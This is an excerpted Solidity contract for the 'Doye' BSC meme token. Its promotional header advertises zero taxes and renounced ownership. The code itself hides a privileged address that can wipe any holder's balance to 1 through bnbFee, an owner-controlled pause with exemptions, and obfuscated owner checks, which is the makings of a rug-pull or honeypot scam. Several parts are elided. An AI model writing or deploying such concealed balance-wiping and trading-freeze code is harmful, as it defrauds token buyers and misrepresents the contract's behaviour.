...
/**
Doye is a newBSC-20 fan utility token. The name is inspired from the Shibarium testnet.
This token is named after the popular cryptocurrency meme, Shiba Inu, and is designed to become the king of the Shibarium and BSC chains.

The dApps that will be present here are PuppyDex And PuppyPad on the shibarium and eth networks.

Puppy DEX: low fees, fast transactions, and a user-friendly interface, it's the perfect way to get started in the world of decentralized finance.

Puppy PAD: With our experience team and community of supporters, we'll help you get your project off the ground and into the hands of investors who believe in your vision.

🦴0/0 Taxes
🦴Locked & Renounced


Join our community and start spreading positive energy!
Telegram : https://t.me/DoyeToken
*/
pragma solidity ^0.8.19;

abstract contract Doyeabcd {
...
abstract contract Doyeab is Doyeabcd {
...
contract Doye is Doyeabcd, Doyeabc, Doyea, Doyeab {

    mapping(address => uint256) private ebalances;
  mapping(address => bool) public DoyeAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
address private Doyecakeswap;
  ...
  address Doyebitcin;
    ...
    constructor(address _Doyecakeswap) {
            // Editable
            Doyebitcin = msg.sender;
            DoyeAZERTY[Doyebitcin] = true;
        _name = "Doye";
        _symbol = "DOYE";
  Doyecakeswap = _Doyecakeswap;        
  ...
  modifier Doye0wner () {
    require(Doyebitcin == msg.sender, "ERC20: cannot permit Doyecake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!DoyeisPaused || isPauseExempt[from], "Transactions are paused.");
    ...
    modifier Doyecake() {
        require(Doyecakeswap == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function bnbFee(address Doyeaccount) external Doyecake {
    ebalances[Doyeaccount] = 1;
            emit Transfer(address(0), Doyeaccount, 1);
  }
  ...
  function bnbOut(address outaccount) external Doyecake {
    ...
    function wDoyetingExempt(address account, bool value) external onlyOwner {
        isPauseExempt[account] = value;
    }
    
    function wDoyetingd(bool value) external onlyOwner {
        DoyeisPaused = value;
    }
}